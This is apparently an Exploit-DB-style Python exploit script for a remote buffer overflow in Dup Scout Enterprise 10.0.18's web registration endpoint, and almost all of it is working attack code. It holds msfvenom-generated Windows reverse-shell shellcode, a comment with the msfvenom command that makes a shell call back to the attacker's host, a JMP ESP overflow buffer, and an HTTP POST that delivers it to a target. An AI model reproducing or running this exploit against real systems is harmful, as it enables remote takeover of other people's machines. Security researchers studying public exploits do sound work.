# Dup Scout Enterprise 10.0.18 - 'online_registration' Remote Buffer Overflow
# Requires web service to be enabled.
# Tested on Windows 10 Pro (x64)
# Based on: https://www.exploit-db.com/exploits/43145 and https://www.exploit-db.com/exploits/40457
# Credits: Tulpa and SICKNESS for original exploits
# Modified: @0rbz_

import socket,os,time,struct,argparse,sys

parser = argparse.ArgumentParser()
parser.add_argument('--host', required=True)
args = parser.parse_args()

host = args.host
port = 80

# change lhost and lport to your preference
# msfvenom --platform windows -p windows/shell_reverse_tcp lhost=$(myip) lport=4445 -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f py -v buf

# replace with output of msfvenom below
buf =  b""
buf += b"\xdb\xda\xd9\x74\x24\xf4\x58\x31\xc9\xbe\x7c\xdc"
buf += b"\x9a\xd7\xb1\x52\x31\x70\x17\x03\x70\x17\x83\xbc"
buf += b"\xd8\x78\x22\xc0\x09\xfe\xcd\x38\xca\x9f\x44\xdd"
buf += b"\xfb\x9f\x33\x96\xac\x2f\x37\xfa\x40\xdb\x15\xee"
buf += b"\xd3\xa9\xb1\x01\x53\x07\xe4\x2c\x64\x34\xd4\x2f"
buf += b"\xe6\x47\x09\x8f\xd7\x87\x5c\xce\x10\xf5\xad\x82"
buf += b"\xc9\x71\x03\x32\x7d\xcf\x98\xb9\xcd\xc1\x98\x5e"
buf += b"\x85\xe0\x89\xf1\x9d\xba\x09\xf0\x72\xb7\x03\xea"
buf += b"\x97\xf2\xda\x81\x6c\x88\xdc\x43\xbd\x71\x72\xaa"
buf += b"\x71\x80\x8a\xeb\xb6\x7b\xf9\x05\xc5\x06\xfa\xd2"
buf += b"\xb7\xdc\x8f\xc0\x10\x96\x28\x2c\xa0\x7b\xae\xa7"
buf += b"\xae\x30\xa4\xef\xb2\xc7\x69\x84\xcf\x4c\x8c\x4a"
buf += b"\x46\x16\xab\x4e\x02\xcc\xd2\xd7\xee\xa3\xeb\x07"
buf += b"\x51\x1b\x4e\x4c\x7c\x48\xe3\x0f\xe9\xbd\xce\xaf"
buf += b"\xe9\xa9\x59\xdc\xdb\x76\xf2\x4a\x50\xfe\xdc\x8d"
buf += b"\x97\xd5\x99\x01\x66\xd6\xd9\x08\xad\x82\x89\x22"
buf += b"\x04\xab\x41\xb2\xa9\x7e\xc5\xe2\x05\xd1\xa6\x52"
buf += b"\xe6\x81\x4e\xb8\xe9\xfe\x6f\xc3\x23\x97\x1a\x3e"
buf += b"\xa4\x58\x72\x10\xb4\x31\x81\x90\xa5\x9c\x0c\x76"
buf += b"\xaf\x0e\x59\x21\x58\xb6\xc0\xb9\xf9\x37\xdf\xc4"
buf += b"\x3a\xb3\xec\x39\xf4\x34\x98\x29\x61\xb5\xd7\x13"
buf += b"\x24\xca\xcd\x3b\xaa\x59\x8a\xbb\xa5\x41\x05\xec"
buf += b"\xe2\xb4\x5c\x78\x1f\xee\xf6\x9e\xe2\x76\x30\x1a"
buf += b"\x39\x4b\xbf\xa3\xcc\xf7\x9b\xb3\x08\xf7\xa7\xe7"
buf += b"\xc4\xae\x71\x51\xa3\x18\x30\x0b\x7d\xf6\x9a\xdb"
buf += b"\xf8\x34\x1d\x9d\x04\x11\xeb\x41\xb4\xcc\xaa\x7e"
buf += b"\x79\x99\x3a\x07\x67\x39\xc4\xd2\x23\x49\x8f\x7e"
buf += b"\x05\xc2\x56\xeb\x17\x8f\x68\xc6\x54\xb6\xea\xe2"
buf += b"\x24\x4d\xf2\x87\x21\x09\xb4\x74\x58\x02\x51\x7a"
buf += b"\xcf\x23\x70"

buffer = "\x41" * 260
buffer += struct.pack("<L", 0x10090c83) # JMP ESP - libspp
buffer += "\x90" * 20
buffer += buf
buffer += "\x90" * (10000 - len(buffer))

evil =  "POST /online_registration HTTP/1.1\r\n"
evil += "Host: " + sys.argv[2] +"\r\n"
evil += "User-Agent: Mozilla/5.0\r\n"
evil += "Connection: close\r\n"
evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
evil += "Accept-Language: en-us,en;q=0.5\r\n"
evil += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
evil += "Keep-Alive: 300\r\n"
evil += "Proxy-Connection: keep-alive\r\n"
evil += "Content-Type: application/x-www-form-urlencoded\r\n"
evil += "Content-Length: 17000\r\n\r\n"
evil += "customer_name=" + buffer
evil += "&unlock_key=" + buffer + "\r\n"

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect((host,port))
print 'Sending evil buffer...'
s.send(evil)
print 'Payload Sent!'
s.close()